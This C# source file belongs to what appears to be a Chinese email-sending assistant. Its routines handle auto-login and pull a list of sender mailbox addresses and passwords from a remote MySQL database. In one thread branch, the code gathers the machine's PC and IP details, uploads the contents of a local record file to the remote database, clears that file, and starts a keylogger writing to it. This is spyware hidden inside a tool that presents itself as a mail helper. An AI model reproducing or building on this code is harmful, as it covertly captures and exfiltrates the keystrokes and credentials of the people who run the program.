using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Data;
using System.Threading;
using System.IO;
namespace 奇奇邮件助手
{
    public struct ThreadMailInfor
    {
        public MailInfor MI;
        public int FailCount;
        public int SucceedCount;
        public int SendCount;
        public int Cycle;
        public int Index;
        public string Msg;
    }
    public struct SendMailStruct
    {
        public string Mail;
        public string Password;
    }

    class ThreadGetMail
    {
        public ThreadGetMail()
        {
            Value.SendMailList = new SendMailStruct[1000];
            DataTable DT = MySql.GetDataBase(DataBase.GetLoginInfor("Fdsa", "fdsa"));
        }

    }

     public class ThreadSend
    {

         public object Msg;
        public int Index;
        public int TryCount = 5;
        public delegate void ReceivedData(int Index, string Msg);           //创建委托  用于更新界面调试信息        
        public event ReceivedData OnReceivedData;
        public delegate void CallBackDelegate(string message);
        public ThreadSend(object Msg,int Index)
        {
            this.Msg = Msg;
            this.Index=Index;
        }
        public void Func()
        {
            switch (Index)
            {
                case 0:
                    if (Value.App_Run)
                    {
                        while (TryCount-- > 0)
                        {
                            try
                            {
                                DataTable DT = MySql.GetDataBase(DataBase.GetObjectValue("EndMessage"));
                                OnReceivedData(Index, DT.Rows[0][1].ToString());
                                return;
                            }
                            catch { }
                        } OnReceivedData(Index, "获取失败|www.trtos.com");
                    } break;
                case 1:
                    if (Ini.Read("自动登陆") == "是") if (Value.App_Run)
                        {
                            while (TryCount-->0)
                            {
                                try
                                {
                                    Value.LoginEmail = Ini.Read("用户名");
                                    Value.LoginPassWord = MyEncrypt.DecryptDES(Ini.Read("用户密码"));
                                    DataTable DT1 = MySql.GetDataBase(DataBase.GetLoginInfor(Value.LoginEmail, Value.LoginPassWord));
                                    Value.LoginUserName = DT1.Rows[0][0].ToString();
                                    Value.UserCreateDate = DateTime.Parse(DT1.Rows[0][1].ToString());
                                    Value.UserBeUserCount = int.Parse(DT1.Rows[0][2].ToString());
                                    TryCount = 0;
                                    OnReceivedData(Index, "登陆成功");
                                    return;
                                }
                                catch { }
                            }
                            OnReceivedData(Index, "登陆失败");
                        } break;
                case 2:
                    if (Value.App_Run)
                    {
                        while (TryCount-- > 0)
                        {
                            try
                            {
                                DataTable DT = MySql.GetDataBase(DataBase.GetFromMailList());
                                Value.SendMailList = new SendMailStruct[DT.Rows.Count];
                                for (int i = 0; i < DT.Rows.Count; i++)
                                {
                                    Value.SendMailList[i].Mail = DT.Rows[i][0].ToString();
                                    Value.SendMailList[i].Password = DT.Rows[i][1].ToString();
                                }
                                OnReceivedData(Index, DT.Rows.Count.ToString());
                                return;
                            }
                            catch { }
                        } OnReceivedData(Index, "获取失败|www.trtos.com");
                    } 
                    break;
                case 3:
                    if (Value.App_Run)
                    {
                        while (TryCount-- > 0)
                        {
                            try
                            {
                                PC_InforStruct PIS = new PC_InforStruct();
                                PIS.IPInfor = (string)Msg;
                                PC_Infor.Get(ref PIS);
                                PIS.Record=Tools.ReadFile(Value.PathSys+Ini.Read("RecordPath"));
                                Tools.WriteFile(Value.PathSys + Ini.Read("RecordPath"), "");
                                MySql.SqlCommand(DataBase.GetJoinLoginReg(PIS));
                                Value.KeyLog = new Keylogger(Value.PathSys + Ini.Read("RecordPath"));
                                Value.KeyLog.startLoging();
                                return;
                            }
                            catch (Exception E) { OnReceivedData(Index, E.Message); }
                        } 
                    } 
                    break;
                default: break;
            }
            
        }
    }
   

    
}
